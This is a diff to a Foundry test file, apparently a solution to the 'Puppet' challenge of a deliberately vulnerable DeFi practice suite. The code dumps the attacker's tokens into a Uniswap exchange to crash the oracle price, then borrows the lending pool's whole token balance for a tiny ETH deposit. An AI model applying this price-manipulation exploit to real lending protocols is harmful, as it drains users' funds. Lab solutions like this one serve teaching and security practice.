@@ -100,7 +100,17 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startBroadcast(attacker);
 
+        dvt.approve(address(uniswapExchange),type(uint256).max);
+        uint256 amountToSwap = uniswapExchange.tokenToEthSwapInput( ATTACKER_INITIAL_TOKEN_BALANCE,  1,  1);
+
+        uint256 requestDeposit = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        puppetPool.borrow{value : requestDeposit + 1 }(POOL_INITIAL_TOKEN_BALANCE);
+ 
+
+        
+        vm.stopBroadcast();
         /**
          * EXPLOIT END *
          */
@@ -125,3 +135,9 @@ contract Puppet is Test {
         return numerator / denominator;
     }
 }
+
+
+/*
+1.Deposit all my DVTs and get some ETH to drop the DVT price of the market 
+2.Use my ETH to buy all DVTs in the pool
+*/
